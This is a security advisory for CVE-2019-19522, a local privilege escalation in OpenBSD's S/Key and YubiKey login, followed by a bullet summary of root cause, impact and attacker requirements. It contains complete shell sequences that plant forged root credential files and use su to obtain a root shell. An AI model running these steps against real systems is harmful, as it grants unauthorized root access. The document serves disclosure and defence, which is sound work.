```
 CVE-2019-19522: Local privilege escalation via S/Key and YubiKey
 ==============================================================================

 If the S/Key or YubiKey authentication type is enabled (they are both
 installed by default but disabled), then a local attacker can exploit
 the privileges of the group "auth" to obtain the full privileges of the
 user "root" (because login_skey and login_yubikey do not verify that the
 files in /etc/skey and /var/db/yubikey belong to the correct user, and
 these directories are both writable by the group "auth").

 (Note: to obtain the privileges of the group "auth", a local attacker
 can first exploit CVE-2019-19520 in xlock.)

 If S/Key is enabled (via skeyinit -E), a local attacker with "auth"
 privileges can add an S/Key entry (a file in /etc/skey) for the user
 "root" (if this file already exists, the attacker cannot simply remove
 or rename it, because /etc/skey is sticky; a simple workaround exists,
 and is left as an exercise for the interested reader):

 ------------------------------------------------------------------------------
 $ id
 uid=32767(nobody) gid=11(auth) groups=32767(nobody)

 $ echo 'root md5 0100 obsd91335 8b6d96e0ef1b1c21' > /etc/skey/root

 $ chmod 0600 /etc/skey/root

 $ env -i TERM=vt220 su -l -a skey
 otp-md5 99 obsd91335
 S/Key Password: EGG LARD GROW HOG DRAG LAIN

 # id
 uid=0(root) gid=0(wheel) ...
 ------------------------------------------------------------------------------

 If YubiKey is enabled (via login.conf), a local attacker with "auth"
 privileges can add a YubiKey entry (two files in /var/db/yubikey) for
 the user "root" (if these files already exist, the attacker can simply
 remove or rename them, because /var/db/yubikey is not sticky):

 ------------------------------------------------------------------------------
 $ id
 uid=32767(nobody) gid=11(auth) groups=32767(nobody)

 $ echo 32d32ddfb7d5 > /var/db/yubikey/root.uid

 $ echo 554d5eedfd75fb96cc74d52609505216 > /var/db/yubikey/root.key

 $ env -i TERM=vt220 su -l -a yubikey
 Password: krkhgtuhdnjclrikikklulkldlutreul

 # id
 uid=0(root) gid=0(wheel) ...
 ------------------------------------------------------------------------------
 ```

 - **Root cause of vulnerability**: login_skey and login_yubikey do not verify that the files in `/etc/skey` and `/var/db/yubikey` belong to the correct user.
 - **Weaknesses/vulnerabilities present**: The directories `/etc/skey` and `/var/db/yubikey` are writable by the group `auth`.
 - **Impact of exploitation**: A local attacker with `auth` group privileges can gain full `root` privileges.
 - **Attack vectors**:
   - If S/Key is enabled, the attacker can add an S/Key entry for the user `root` in `/etc/skey`.
   - If YubiKey is enabled, the attacker can add a YubiKey entry for the user `root` in `/var/db/yubikey`.
 - **Required attacker capabilities/position**:
   - Local access to the system.
   - Membership in the `auth` group (can be obtained by exploiting CVE-2019-19520).
   - S/Key or YubiKey authentication type must be enabled.
```